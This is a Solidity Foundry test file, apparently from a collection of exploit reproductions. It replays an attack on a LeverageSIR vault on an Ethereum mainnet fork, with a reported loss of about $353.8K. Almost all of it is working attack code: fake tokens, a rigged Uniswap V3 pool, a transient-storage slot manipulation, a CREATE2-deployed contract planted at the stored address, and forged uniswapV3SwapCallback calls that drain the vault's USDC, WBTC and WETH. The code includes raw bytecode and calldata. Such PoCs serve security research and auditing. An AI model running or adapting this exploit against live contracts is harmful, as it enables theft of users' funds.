// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 353.8 K (17814,86 USDC, 1,4085 WBTC, 119,87 WETH)
// Original Attacker : https://etherscan.io/address/0x27defcfa6498f957918f407ed8a58eba2884768c
// Attack Contract(Main) : https://etherscan.io/address/0xea55fffae1937e47eba2d854ab7bd29a9cc29170
// Attack Contract(Dumb Token) : https://etherscan.io/address/0x341c853c09b3691b434781078572f9d3ab9e3cbb
// Attack Contract(Create2 Deployed) : https://etherscan.io/address/0x00000000001271551295307acc16ba1e7e0d4281
// Vulnerable Contract : https://etherscan.io/address/0xb91ae2c8365fd45030aba84a4666c4db074e53e7
// Attack Tx : https://etherscan.io/tx/0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant vault = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;

address constant uniV3PositionsNFT = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant immutableCreate2Factory = 0x0000000000FFe8B47B3e2130213B802212439497;

address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

contract LeverageSIR_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 22_157_900 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC_A attC_A = new AttackerC_A();
        AttackerC_B attC_B = new AttackerC_B();
        while (address(attC_A) < address(attC_B)) {
            attC_B = new AttackerC_B();
        }
        
        attC_A.attack(attC_B);

        console2.log("Profit:", IFS(usdc).balanceOf(attacker), 'USDC');
        console2.log("Profit:", IFS(wbtc).balanceOf(attacker), 'WBTC');
        console2.log("Profit:", IFS(weth).balanceOf(attacker), 'WETH');
    }
}

contract AttackerC_A is Test {
    function attack(AttackerC_B attC_B) external {
        IPoolInitializer(uniV3PositionsNFT).createAndInitializePoolIfNecessary(
            address(attC_B),
            address(this), 
            100, 
            79228162514264337593543950336
        );

        uint256 amount1 = 108823205127466839754387550950703;
        INonfungiblePositionManager(uniV3PositionsNFT).mint(INonfungiblePositionManager.MintParams(
            address(attC_B),
            address(this), 
            100,
            -190000,
            190000,
            amount1,
            amount1,
            0,
            0,
            address(this), 
            block.timestamp
        ));
        
        Uni_Router_V3(uniV3Router).exactInputSingle(Uni_Router_V3.ExactInputSingleParams(
            address(this), 
            address(attC_B),
            100,
            address(this), 
            block.timestamp,
            114814730000000000000000000000000000,
            0,
            0
        ));
        
        IFS(vault).initialize(IFS.VaultParameters(
            address(attC_B),
            address(this),
            0
        ));

        // Manipulate SLOT 1 (`tstore(1, amount)`)
        IFS(vault).mint(
            true,
            IFS.VaultParameters(
                address(attC_B),
                address(this),
                0
            ),
            139650998347915452795864661928406629,
            1
        );

        // Create a contract with the same address of SLOT 1(95759995883742311247042417521410689 === 0x00000000001271551295307acc16ba1e7e0d4281)
        address deploymentAddress = IFS(immutableCreate2Factory).safeCreate2(
            0x0000000000000000000000000000000000000000d739dcf6ae98b123e5650020,
            hex'608060405234801561001057600080fd5b50600080546001600160a01b031916321790556102f2806100326000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806311b92ab914610046578063d6d2b6ba1461005b578063e086e5ec1461006e575b600080fd5b61005961005436600461020d565b610076565b005b61005961006936600461020d565b6100ff565b61005961016d565b6000546001600160a01b0316321461008d57600080fd5b6000836001600160a01b031683836040516100a9929190610276565b6000604051808303816000865af19150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b606091505b50509050806100f957600080fd5b50505050565b6000546001600160a01b0316321461011657600080fd5b6000836001600160a01b03168383604051610132929190610276565b600060405180830381855af49150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b6000546001600160a01b0316321461018457600080fd5b60405132904780156108fc02916000818181858888f193505050501580156101b0573d6000803e3d6000fd5b50565b80356101be816102a8565b92915050565b60008083601f8401126101d657600080fd5b50813567ffffffffffffffff8111156101ee57600080fd5b60208301915083600182028301111561020657600080fd5b9250929050565b60008060006040848603121561022257600080fd5b600061022e86866101b3565b935050602084013567ffffffffffffffff81111561024b57600080fd5b610257868287016101c4565b92509250509250925092565b600061027083858461029c565b50500190565b6000610283828486610263565b949350505050565b60006001600160a01b0382166101be565b82818337506000910152565b6102b18161028b565b81146101b057600080fdfea26469706673582212206248366d18b20b1f2aadb961f5564f10ba9323e8fa7413f070e5cbc150a2d0b064736f6c63430008040033'
        );

        // At this point the deploymentAddress contract have the control to call the uniswapV3SwapCallback function
        
        // Take all USDC from Vault contract to deploymentAddress contract
        deploymentAddress.call(hex'11b92ab9000000000000000000000000b91ae2c8365fd45030aba84a4666c4db074e53e700000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000224fa461e3300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000425d93b54000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a000000000000000000000000959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000');

        // Transfer all USDC from deploymentAddress contract to attacker
        // And again manipulate SLOT 1 (`tstore(1, amount)`) so that it is this(AttackerC_A) contract
        deploymentAddress.call(hex'11b92ab9000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000009dF0C6b0066D5317aA5b38B36850548DaCCa6B4e0000000000000000000000000000000000000000000000000000000425d93b5400000000000000000000000000000000000000000000000000000000');

        // Now take all the WBTC
        uint256 wbtcBal = IERC20(wbtc).balanceOf(vault);
        bytes memory data3;
        data3 = bytes.concat(data3, bytes32(uint256(uint160(address(this)))));
        data3 = bytes.concat(data3, bytes32(uint256(uint160(address(this)))));
        data3 = bytes.concat(data3, bytes32(uint256(uint160(wbtc))));
        data3 = bytes.concat(data3, bytes32(uint256(uint160(address(this)))));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(uint256(1)));

        IFS(vault).uniswapV3SwapCallback(
            0,
            int256(wbtcBal),
            data3
        );

        IERC20(wbtc).transfer(msg.sender, wbtcBal);

        // And finally take all the WETH
        uint256 wethBal = IERC20(weth).balanceOf(vault);
        bytes memory data4;
        data4 = bytes.concat(data4, bytes32(uint256(uint160(address(this)))));
        data4 = bytes.concat(data4, bytes32(uint256(uint160(address(this)))));
        data4 = bytes.concat(data4, bytes32(uint256(uint160(weth))));
        data4 = bytes.concat(data4, bytes32(uint256(uint160(address(this)))));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(uint256(1)));

        IFS(vault).uniswapV3SwapCallback(
            0,
            int256(wethBal),
            data4
        );

        IERC20(weth).transfer(msg.sender, wethBal);
    }

    // ERC20

    mapping(address => uint256) public balanceOf;

    function symbol() external view returns (string memory){
        return "";
    }

    function decimals() external view returns (uint8) {
        return 18;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    struct Reserves {
        uint144 reserveApes;
        uint144 reserveLPers;
        int64 tickPriceX42;
    }
    struct Fees {
        uint144 collateralInOrWithdrawn;
        uint144 collateralFeeToStakers;
        uint144 collateralFeeToLPers;
    }

    function mint(
        address to,
        uint16 baseFee,
        uint8 tax,
        Reserves memory reserves,
        uint144 collateralDeposited
    ) external returns (Reserves memory newReserves, Fees memory fees, uint256 amount) {
        newReserves = Reserves(10000000000, 0, 0);
        fees = Fees(0, 0, 0);
        amount = uint160(address(this));
    }
}

contract AttackerC_B {
    mapping(address => uint256) public balanceOf;

    function symbol() external view returns (string memory){
        return "";
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }
}

interface IFS is IERC20 {
    // Vault
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters memory vaultParams) external;
    function mint(
        bool isAPE,
        VaultParameters memory vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;

    // ImmutableCreate2Factory
    function safeCreate2(
        bytes32 salt,
        bytes calldata initializationCode
    ) external payable returns (address deploymentAddress);
}

